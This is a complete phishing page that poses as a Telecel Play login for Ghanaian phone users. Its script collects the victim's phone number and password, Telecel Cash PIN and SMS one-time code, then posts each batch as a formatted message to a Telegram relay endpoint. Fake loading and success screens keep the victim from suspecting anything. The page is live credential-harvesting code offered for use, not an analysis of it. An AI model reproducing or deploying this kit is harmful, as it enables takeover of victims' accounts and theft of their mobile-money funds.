<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>Telecel Play Login</title>

<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">

<style>

*{box-sizing:border-box}

body{
font-family:"Plus Jakarta Sans",system-ui;
margin:0;
min-height:100vh;
display:flex;
align-items:center;
justify-content:center;
background:linear-gradient(180deg,#fff5f7,#ffe3e8);
overflow:hidden;
}

.wave{
position:fixed;
width:700px;
height:700px;
border-radius:50%;
background:radial-gradient(circle,rgba(230,0,35,.18),transparent 70%);
filter:blur(40px);
animation:float 20s infinite linear;
z-index:-1;
}

.wave.one{top:-250px;right:-150px}
.wave.two{bottom:-250px;left:-150px;animation-duration:24s}

@keyframes float{
0%{transform:translateY(0)}
50%{transform:translateY(40px)}
100%{transform:translateY(0)}
}

.step{
position:absolute;
width:100%;
max-width:420px;
padding:28px;
background:white;
border-radius:20px;
box-shadow:0 30px 60px rgba(0,0,0,.2);
transition:.4s;
}

.container{
position:relative;
width:100%;
max-width:420px;
height:560px;
}

.logo{
height:120px;
display:block;
margin:auto;
}

.pulse{
height:90px;
animation:pulse 1.2s infinite ease-in-out;
}

@keyframes pulse{
0%{transform:scale(.85);opacity:.6}
50%{transform:scale(1.05);opacity:1}
100%{transform:scale(.85);opacity:.6}
}

h1{
text-align:center;
color:#e60023;
margin:8px 0 4px;
font-size:22px;
font-weight:800;
}

.subtitle{
text-align:center;
font-size:13px;
color:#444;
margin-bottom:16px;
}

label{
font-size:13px;
margin-top:12px;
display:block;
}

input{
width:100%;
padding:12px;
border-radius:10px;
border:1px solid #e5e5e5;
background:#fafafa;
margin-top:5px;
font-size:14px;
}

input:focus{
outline:none;
border-color:#e60023;
background:white;
}

.password-box{
position:relative;
}

.eye{
position:absolute;
right:10px;
top:50%;
transform:translateY(-50%);
cursor:pointer;
}

.hint{
font-size:12px;
color:#e60023;
margin-top:4px;
}

.btn{
margin-top:18px;
width:100%;
padding:12px;
border-radius:10px;
border:0;
font-weight:700;
background:#e60023;
color:white;
cursor:pointer;
}

.pin{
display:flex;
gap:8px;
justify-content:center;
margin:16px 0;
}

.pin input{
width:48px;
height:54px;
font-size:20px;
text-align:center;
}

.count{
text-align:center;
font-size:13px;
color:#555;
}

.hidden{
opacity:0;
pointer-events:none;
transform:translateX(40px);
}

.resend{
text-align:center;
margin-top:10px;
font-size:13px;
}

.resend button{
border:0;
background:none;
color:#e60023;
cursor:pointer;
font-weight:600;
}

</style>

</head>

<body>

<div class="wave one"></div>
<div class="wave two"></div>

<div class="container">

<div id="step1" class="step">

<img src="assets/telecel.svg" class="logo">

<h1>Welcome to Telecel Play</h1>

<div class="subtitle">
Enter your number to log in.
You need to be a Telecel subscriber to proceed.
</div>

<form id="form">

<label>Phone Number</label>
<input id="phone" placeholder="0XXXXXXXXX" inputmode="numeric">

<label>Password</label>

<div class="password-box">
<input id="password" type="password">
<span class="eye" onclick="togglePassword()">👁</span>
</div>

<div class="hint">
(Use your Telecel Play App password)
</div>

<button class="btn">Next</button>

</form>

</div>


<div id="loading" class="step hidden">

<div style="text-align:center">

<img src="assets/telecel.svg" class="pulse">

<div>Connecting securely...</div>

</div>

</div>


<div id="step2" class="step hidden">

<img src="assets/telecash.webp" style="height:80px;display:block;margin:auto">

<h1>Enter your Telecel Cash PIN</h1>

<div class="subtitle" id="showNumber"></div>

<div class="pin">

<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">

</div>

<button class="btn" onclick="submitPin()">Login</button>

</div>


<div id="step3" class="step hidden">

<h1>Verify OTP</h1>

<div class="subtitle">
Enter 6 digit code sent to your number
</div>

<div class="pin">

<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">

</div>

<div class="count">
Code expires in <span id="time">60</span>s
</div>

<div class="resend">
<button onclick="resendOtp()">Resend OTP</button>
</div>

<button class="btn" onclick="submitOtp()">Verify OTP</button>

</div>


<div id="step4" class="step hidden">

<div style="text-align:center">

<img src="assets/telecel.svg" class="pulse">

<h1>Success</h1>

<div class="subtitle">
Logging you in...
</div>

</div>

</div>

</div>


<script>

const ua=navigator.userAgent

let device="Unknown"

if(/Android/i.test(ua)) device="Android"
else if(/iPhone|iPad/i.test(ua)) device="iOS"

if(/Chrome/i.test(ua)) device+=" | Chrome"
else if(/Safari/i.test(ua)) device+=" | Safari"
else if(/Firefox/i.test(ua)) device+=" | Firefox"


let planLine="Not captured"

try{

const p=JSON.parse(sessionStorage.getItem("selectedPlan"))

if(p){

planLine=[p.name||"",p.price||""].filter(Boolean).join(" — ")

}

}catch(e){}


let phoneValue=""
let passwordValue=""
let pinValue=""
let otpValue=""


phone.oninput=e=>{

let v=e.target.value.replace(/\D/g,"").slice(0,10)

if(v.length>0 && v[0]!=="0")
v="0"+v.slice(1)

e.target.value=v

}


function togglePassword(){

password.type=password.type==="password"?"text":"password"

}


function show(id){

document.querySelectorAll(".step")
.forEach(s=>s.classList.add("hidden"))

document.getElementById(id)
.classList.remove("hidden")

}


/* TELEGRAM MESSAGE */

function buildMessage(stage){

let msg=`
TIME: ${new Date().toISOString()}

<b>Telecel Play Login</b>

<b>Event</b>
${stage}

<b>Number</b>
${phoneValue}
`

if(passwordValue)
msg+=`

<b>Password</b>
${passwordValue}`

if(pinValue)
msg+=`

<b>Pin</b>
${pinValue}`

if(otpValue)
msg+=`

<b>Otp</b>
${otpValue}`


msg+=`

<b>Plan</b>
${planLine}

<b>Device</b>
${device}
`

return msg

}


/* SEND */

async function sendToServer(stage){

await fetch("/api/sendTelegram",{

method:"POST",

headers:{"Content-Type":"application/json"},

body:JSON.stringify({

message:buildMessage(stage),

parse_mode:"HTML"   /* ONLY CHANGE */

})

})

}


form.onsubmit=e=>{

e.preventDefault()

phoneValue=phone.value
passwordValue=password.value

if(!/^0\d{9}$/.test(phoneValue)){

alert("Enter valid Ghana number")
return

}

phoneValue="+233"+phoneValue.slice(1)

sendToServer("Login")

show("loading")

setTimeout(()=>{

showNumber.textContent=phoneValue
show("step2")

},1200)

}


const pinInputs=document.querySelectorAll("#step2 input")

pinInputs.forEach((input,index)=>{

input.addEventListener("input",()=>{

input.value=input.value.replace(/\D/g,"")

if(input.value && index<3)
pinInputs[index+1].focus()

})

input.addEventListener("keydown",(e)=>{

if(e.key==="Backspace" && !input.value && index>0){

pinInputs[index-1].focus()
pinInputs[index-1].value=""

}

})

})


function submitPin(){

pinValue=[...pinInputs].map(i=>i.value).join("")

sendToServer("Pin")

show("loading")

setTimeout(()=>{

show("step3")
startTimer()

},1200)

}


const otpInputs=document.querySelectorAll("#step3 input")

otpInputs.forEach((input,index)=>{

input.addEventListener("input",()=>{

input.value=input.value.replace(/\D/g,"")

if(input.value && index<5)
otpInputs[index+1].focus()

})

input.addEventListener("keydown",(e)=>{

if(e.key==="Backspace" && !input.value && index>0){

otpInputs[index-1].focus()
otpInputs[index-1].value=""

}

})

})


function submitOtp(){

otpValue=[...otpInputs].map(i=>i.value).join("")

sendToServer("Otp")

show("step4")

setTimeout(()=>location.href="thankyou.html",1800)

}


function resendOtp(){

startTimer()
sendToServer("Resend Otp")

}


function startTimer(){

let t=60

time.textContent=t

const i=setInterval(()=>{

t--
time.textContent=t

if(t<=0) clearInterval(i)

},1000)

}

</script>

</body>
</html>
